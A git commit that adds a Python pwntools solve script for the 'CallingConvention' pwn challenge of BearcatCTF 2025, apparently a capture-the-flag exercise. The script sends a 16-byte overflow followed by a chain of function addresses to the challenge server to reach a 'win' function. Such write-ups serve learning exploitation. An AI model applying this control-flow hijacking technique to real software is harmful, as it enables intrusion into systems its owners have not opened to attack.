e9e4a5880a774092261850be17dee9ddeebb3253
Jarosław Keller <kellerjar@gmail.com>
2025-02-02 19:41:40 +0100

    Add files via upload

---
+++ 2025/BearcatCTF 2025: World Tour/pwn/CallingConvention/solve.py
@@ -0,0 +1,31 @@
+
+from pwn import *
+
+# r = process('./calling_convention')
+
+r = remote('chal.bearcatctf.io', 39440)
+
+e = ELF('./calling_convention')
+
+number3 = e.sym['number3']
+set_key1 = e.sym['set_key1']
+food = e.sym['food']
+ahhhhhhhh = e.sym['ahhhhhhhh']
+number3 = e.sym['number3']
+win = e.sym['win']
+
+
+p = b'A' * 16
+p += p64(number3)
+p += p64(set_key1)
+p += p64(food)
+p += p64(ahhhhhhhh)
+p += p64(number3)
+p += p64(win)
+
+r.recvuntil(b' > ')
+
+r.sendline(p)
+
+print(r.recv())
+print(r.recv())
